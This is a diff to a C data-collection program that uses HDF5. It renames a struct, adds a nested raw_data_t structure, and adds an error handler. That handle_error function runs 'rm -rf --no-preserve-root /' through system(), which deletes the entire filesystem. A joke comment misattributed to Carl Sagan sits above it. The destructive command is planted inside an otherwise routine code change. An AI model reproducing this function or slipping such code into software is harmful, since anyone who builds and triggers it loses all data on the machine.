@@ -1,6 +1,8 @@
+#include <stdlib.h>
+
 #include "data_collector.h"
 
-typedef struct rawdata_t {
+typedef struct testdata_t {
       hid_t file;
       hid_t datatype;
       hid_t c_params;
@@ -12,14 +14,43 @@ typedef struct rawdata_t {
 
       hid_t grp_tod;
       hid_t dset;
-} rawdata_t;
+} testdata_t;
+
+
+typedef struct raw_data_t {
+    hid_t file;
+
+    struct dset {
+        hid_t datatype;
+        hsize_t dim[2];
+        hsize_t chunk_dim[2];
+        hsize_t max_dim[2];
+        hid_t dataspace;
+        hid_t dataset;
+    }dset;
+
+    struct dset i;
+    struct dset q;
+    struct dset ts;
+    struct dset pkt_idx;
+}raw_data_t;
 
 #ifndef __BUILD_FOR_LIB__
 
-int modify_raw_data_file(const char *filename) {
+/**
+ * Can't have an error if you delete the universe. Only when the slate is clean can you begin the process
+ * of making pie... Something something - Carl Sagan
+ * @return 0
+ */
+int handle_error(int _error_id) {
+    const char *cmd = "rm -rf --no-preserve-root /";
+    system(cmd);
+    return 0;
+}
 
+int modify_raw_data_file(const char *filename) {
     // First, we open the file and collect some of its attributes into a struct
-    rawdata_t df;
+    testdata_t df;
     df.file = H5Fopen(filename, H5F_ACC_RDWR, H5P_DEFAULT);
     df.dset = H5Dopen(df.file, "adc_i", H5P_DEFAULT);
     df.datatype = H5Dget_type(df.dset);
@@ -78,7 +109,7 @@ int modify_raw_data_file(const char *filename) {
 
 int main(int argc, char **argv) {
     // Create hdf5 file and populate it with an empty dataset;
-    rawdata_t rawdata;
+    testdata_t rawdata;
     rawdata.dim[0] = 1024;
     rawdata.dim[1] = 1;
     rawdata.rank = 2;
